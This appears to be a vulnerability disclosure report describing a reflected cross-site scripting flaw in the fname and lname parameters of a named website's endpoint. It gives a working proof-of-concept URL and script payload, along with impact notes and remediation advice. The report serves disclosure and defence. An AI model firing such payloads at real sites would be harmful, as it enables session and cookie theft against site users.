## Title
Reflected Cross-Site Scripting (XSS) 

## Summary
I identified a reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the following endpoint.

## Vulnerable Endpoint
`https://kzlabs.com/1.php?fname=&lname=`

## Steps to Reproduce

1. Open the following URL in a browser:

`https://kzlabs.com/1.php?fname=rajvardhan1%22%3E%3CScRipt%3Ealert%280%29%3C%2FScRipt%3E&lname=rajvardhan1%22%3E%3CScRipt%3Ealert%280%29%3C%2FScRipt%3E`

2. Observe that the injected JavaScript payload is reflected and executed in the browser.

3. A JavaScript alert popup appears, confirming successful reflected XSS.

## Payload Used
`rajvardhan1"><ScRipt>alert(0)</ScRipt>`

## Proof of Concept

## Screenshot 1 — Payload reflected inside the application response

<img width="1920" height="1013" alt="image" src="https://github.com/user-attachments/assets/76c21441-391d-43ca-ad7e-8fb8e4b7b5a8" />


## Impact
- Session hijacking
- Cookie theft
- Phishing attacks
- Account takeover possibilities
- Client-side browser manipulation

## Recommendations for Fix
1. Sanitise and validate all user-controlled input before rendering it in the response.
2. Escape special characters such as:
   `<`, `>`, `"`, `'`, `&`
3. Avoid directly reflecting unsanitised input into HTML contexts.
4. Implement Content Security Policy (CSP) to reduce XSS impact.
5. Use secure output encoding functions.

